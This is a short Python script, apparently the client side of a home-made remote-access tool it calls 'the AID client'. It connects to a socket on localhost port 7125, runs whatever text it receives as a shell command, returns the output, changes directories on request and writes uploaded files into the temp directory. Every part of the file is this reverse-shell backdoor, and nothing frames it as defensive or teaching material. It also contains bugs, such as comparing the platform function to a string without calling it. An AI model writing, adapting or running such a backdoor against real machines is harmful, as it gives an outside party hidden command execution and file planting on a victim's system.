#!/usr/bin/env python

import socket
from os import chdir
from subprocess import check_output, CalledProcessError
from platform import system
from tempfile import gettempdir

sock = socket.socket()
sock.connect(('localhost', 7125))
timeout_val = 60

def change_dir():
    global x
    chdir(x[3:])
    if system == "Windows":
        out = check_output("dir", shell=True)
        sock.send(out)
    else :
        try:
            out = check_output("ls", shell=True)
            sock.send(out)
        except CalledProcessError:
            sock.send('Command not found'.encode())

while 1:
    x = sock.recv(1024)
    print(x)
     #p = subprocess.Popen(x, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
     #out, error = p.communicate()
     #subprocess.call(x, shell=True)
     #print(out)
    try:
        if 'cd' in x.decode():
            try:
                change_dir()
            except CalledProcessError:
                    sock.send('Command not found'.encode())
        elif x.decode('utf-8') == "":
            timeout_val -= 1
            if x.decode('utf-8') == "" and timeout_val == 0:
                sock.close()
                break
            continue
        elif x.decode() == 'QUIT':
            print("\nClosing the connection\n")
            sock.close()
            break
        elif 'UPLOAD' in x.decode():
            filename = x[7:len(x.decode())]
            chdir(gettempdir())
            the_file = sock.recv()
            with open(filename, "wb") as f:
                f.write(the_file)
        else:
            try:
                out = check_output(x.decode(), shell=True)
                sock.send(out)
            except CalledProcessError:
                    sock.send('Command not found'.encode())
        continue

    except KeyboardInterrupt:
        print("\nClosing the AID client \nExiting...")
        sock.close()

